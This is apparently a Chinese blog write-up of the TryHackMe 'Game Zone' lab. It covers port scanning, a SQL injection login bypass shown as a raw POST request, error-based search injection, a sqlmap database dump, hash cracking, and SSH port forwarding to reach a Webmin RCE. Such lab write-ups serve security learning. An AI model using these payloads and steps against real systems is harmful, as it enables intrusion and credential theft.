---
title: "Thm-Gane_zone"
date: "2024-08-17"
description: "*总结一波 "
---

靶机信息

Game Zone

系统

linux

信息

前台登陆处sql注入可以直接拿到shell，之后进入隐藏服务可以拿到对应版本的webmin进行提权

# [](#0x00信息收集 "0x00信息收集")0x00信息收集

### [](#0x01-端口扫描 "0x01 端口扫描")0x01 端口扫描

```shell
Host is up (0.00037s latency).Not shown: 998 closed portsPORT   STATE SERVICE22/tcp open  ssh80/tcp open  httpMAC Address: 02:9D:BB:F6:4E:39 (Unknown)Nmap done: 1 IP address (1 host up) scanned in 2.35 secondsroot@ip-10-10-109-100:~### 详细扫描80 22PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)|   256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)|_  256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (EdDSA)80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))| http-cookie-flags: |   /: |     PHPSESSID: |_      httponly flag not set|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Game ZoneMAC Address: 02:9D:BB:F6:4E:39 (Unknown)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portAggressive OS guesses: Linux 3.13 (99%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.8 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Android 5.0 - 5.1 (92%), Android 5.1 (92%), Linux 3.10 (92%)No exact OS matches for host (test conditions non-ideal).Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT     ADDRESS1   0.40 ms ip-10-10-101-77.eu-west-1.compute.internal (10.10.101.77)
```

> \*总结一波

操作系统

Ubuntu 4ubuntu2.7

ssh22

OpenSSH的版本为7.2p2

80 服务器

Apache/2.4.18

语言

php

cookie

httponly flag not set

## [](#0x02-深入端口 "0x02 深入端口")0x02 深入端口

> \*\*\*总觉得端口太少了 继续扫 nmap全端口扫描

kscan 爆破一下 –hydra 自动化爆破

kscan

[kscan](kscan.md)

> \*\*\*没收获 直接走掉

## [](#0x03-web资产收集 "0x03 web资产收集")0x03 web资产收集

> \*\*有预感还是要 鹿web  
> 利用工具打一圈

### [](#0x031-目录扫描 "0x031 目录扫描")0x031 目录扫描

```shell
[21:11:33] 403 -  298B  - /.ht_wsr.txt                                      [21:11:33] 403 -  301B  - /.htaccess.bak1                                   [21:11:33] 403 -  301B  - /.htaccess.save                                   [21:11:33] 403 -  303B  - /.htaccess.sample[21:11:33] 403 -  301B  - /.htaccess.orig[21:11:33] 403 -  302B  - /.htaccess_extra                                  [21:11:33] 403 -  299B  - /.htaccessBAK[21:11:33] 403 -  299B  - /.htaccess_sc[21:11:33] 403 -  301B  - /.htaccess_orig[21:11:33] 403 -  299B  - /.htaccessOLD[21:11:33] 403 -  300B  - /.htaccessOLD2[21:11:33] 403 -  291B  - /.htm                                             [21:11:33] 403 -  292B  - /.html[21:11:33] 403 -  301B  - /.htpasswd_test                                   [21:11:33] 403 -  298B  - /.httr-oauth                                      [21:11:33] 403 -  297B  - /.htpasswds                                       [21:11:37] 403 -  291B  - /.php                                             [21:11:37] 403 -  292B  - /.php3                                            [21:12:43] 301 -  313B  - /images  ->  http://10.10.101.77/images/          [21:12:43] 200 -  868B  - /images/                                          [21:13:23] 403 -  301B  - /server-status/                                   [21:13:23] 403 -  300B  - /server-status 
```

> 很奇怪 都没有权限

# [](#0x10-web-exp "0x10 web_exp")0x10 web\_exp

> 只有一个登陆框有功能点 因此我们测试 sql 万能密码

sql万能密码

[万能密码](sql%E5%88%86%E7%B1%BB.md#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81)

```shell
POST /index.php HTTP/1.1Host: 10.10.12.101Content-Length: 44Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://10.10.12.101Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://10.10.12.101/index.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=o3940qfoad5k0trucelricpo82Connection: closeusername=admin'or 1=1-- &password=&x=33&y=14
```

> 跳转到一个页面 主要是经营搜索的 这个功能点很可能就有一些搜索的%匹配

[H2 ​（3）搜索型注入点](%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/top10%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E7%AE%80%E4%BB%8B.md#H2%20%E2%80%8B%EF%BC%883%EF%BC%89%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5%E7%82%B9)

> 开始测试 searchitem=2ad123’ 因为这个东西感觉只能是字符的注入  
> 因此开始测试 ‘ 发现报错

```sql
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1
```

\*\*\*’%’’ 可以看出来 就是单引号  
那就好办 直接一把梭

> 但是好久没练习了 借着这个靶场玩一下  
> 目前发现可以是回显注入

[回显注入](sql%E5%88%86%E7%B1%BB.md#%E5%9B%9E%E6%98%BE%E6%B3%A8%E5%85%A5)

不用测了 基本没防护 除了堆注入没有感觉其他都有

## [](#0x11-sqlmap "0x11 sqlmap")0x11 sqlmap

sqlmap

[sqlmap](%E5%B8%B8%E8%A7%84%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/%E6%BC%8F%E6%B4%9E/sqlmap.md)

```shell
sqlmap -r r.txt --dbms=mysql --dump 
```

\*直接拖库得到 用户获得hash和用户名

串”ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14”的长度（64个字符），它看起来像是一个SHA-256哈希值

用户:\*\*\*agent47

> 本来想着能不能 直接 拿到shell 因为我发现 这是一个root 用户使用的MySQL  
> 但是没办法拿不到  
> ![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240608195424.png)

# [](#0x20-普通权限 "0x20 普通权限")0x20 普通权限

先让我们的开膛手约翰叔叔 爆一下  
![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240607164341.png)

> ![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240607163346.png)![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240607163346.png)

直接上线

# [](#0x30-隐藏服务 "0x30 隐藏服务")0x30 隐藏服务

> ss -tulpn 可以看到开放了 很多端口 但是我们的namp 扫描时候只  
> 开放了80 22 因此做一个端口转发 使得端口服务能够暴露出来

![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240609104300.png)  
可以看到我们的kali可以和 目标主机通信并且我们已经拿到了  
对标agent47用户的权限我们完全可以做一个远程端口转发 使得隐藏的服务暴露出来  
增加我们的攻击面  
在kali上做一个转发

```shell
ssh -L 10000:localhost:10000 agent47@10.10.112.17
```

然后进入 查看可以知道是Webmin 1.58

远程代码执行漏洞

[Webmin 1.580](Webmin%201.580.md)

# [](#0X31-Get-shell "0X31  Get_shell")0X31 Get\_shell

> 直接msf 搜索相对应模块

![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240609165809.png)  
![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240609165837.png)
